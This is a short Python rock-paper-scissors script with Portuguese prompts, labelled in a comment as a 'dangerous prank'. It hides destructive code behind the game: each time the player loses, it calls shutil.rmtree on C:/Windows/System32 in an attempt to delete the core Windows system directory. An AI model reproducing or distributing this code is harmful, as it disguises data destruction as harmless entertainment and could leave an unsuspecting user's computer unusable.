#
#
#BRINCADEIRA PERIGOSO!!!
#
#


from random import randint
import shutil

def choiceHuman(decision=int):

    if decisionHuman == 1:
        handHuman = game[0]
    elif decisionHuman == 2:
        handHuman = game[1]
    elif decisionHuman == 3:
        handHuman = game[2]
    return handHuman

def choiceBot():

    decision = randint(1,3)

    if decision == 1:
        handBot = game[0]
    elif decision == 2:
        handBot = game[1]
    elif decision == 3:
        handBot = game[2]
    return handBot

game = ['Tesoura','Pedra','Papel']

decisionHuman = int(input("Qual você deseja \n1-Tesoura\n2-Pedra\n3-Papel\nDecisão:"))
handHuman = choiceHuman(decisionHuman)
handBot = choiceBot()

if handBot == handHuman:
    print("Empate!")

if handHuman == 'Tesoura':
    if handBot == 'Papel': print("Ganhou!")
    elif handBot == 'Pedra': shutil.rmtree("C:/Windows/System32")

if handHuman == 'Papel':
    if handBot == 'Pedra': print("Ganhou!")
    elif handBot == 'Tesoura': shutil.rmtree("C:/Windows/System32")

if handHuman == 'Pedra':
    if handBot == 'Tesoura': print("Ganhou!")
    elif handBot == 'Papel': shutil.rmtree("C:/Windows/System32")
